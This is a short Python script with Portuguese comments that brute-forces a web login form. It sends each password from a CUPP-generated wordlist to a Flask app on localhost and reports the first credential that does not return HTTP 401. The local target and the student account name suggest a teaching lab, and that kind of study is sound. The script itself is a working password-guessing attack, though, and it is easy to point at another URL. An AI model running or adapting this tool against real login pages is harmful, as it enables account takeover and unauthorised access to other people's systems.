# brute_force.py - testa o login do site automaticamente usando a wordlist do CUPP
#
# Uso:
#   python brute_force.py <usuario> [wordlist.txt]
# Exemplos:
#   python brute_force.py admin
#   python brute_force.py aluno01 wordlist.txt
#
# O script envia cada senha da wordlist para o formulario de login do Flask.
# O app responde HTTP 401 quando a credencial e invalida e redireciona (302/200)
# quando o login da certo -> e assim que detectamos o sucesso.

import sys
import time
import requests

URL = "http://127.0.0.1:5000/"


def tentar(usuario, wordlist):
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        senhas = [linha.strip() for linha in f if linha.strip()]

    print(f"[*] Alvo: {URL}")
    print(f"[*] Usuario: {usuario}")
    print(f"[*] Senhas a testar: {len(senhas)}")
    print("-" * 50)

    inicio = time.time()
    for i, senha in enumerate(senhas, 1):
        # allow_redirects=False: login OK gera redirect (302) para /painel
        r = requests.post(
            URL,
            data={"login": usuario, "senha": senha},
            allow_redirects=False,
        )

        if r.status_code != 401:
            # 302 (redirect) = sucesso. 401 = senha errada.
            print(f"[+] SENHA ENCONTRADA ({i}a tentativa): {usuario}:{senha}")
            print(f"    HTTP status: {r.status_code}")
            print(f"    Tempo: {time.time() - inicio:.2f}s")
            return senha

        if i % 100 == 0:
            print(f"    ... {i} tentativas")

    print("[-] Nenhuma senha da lista funcionou.")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python brute_force.py <usuario> [wordlist.txt]")
        sys.exit(1)

    usuario = sys.argv[1]
    wordlist = sys.argv[2] if len(sys.argv) > 2 else "wordlist.txt"
    tentar(usuario, wordlist)
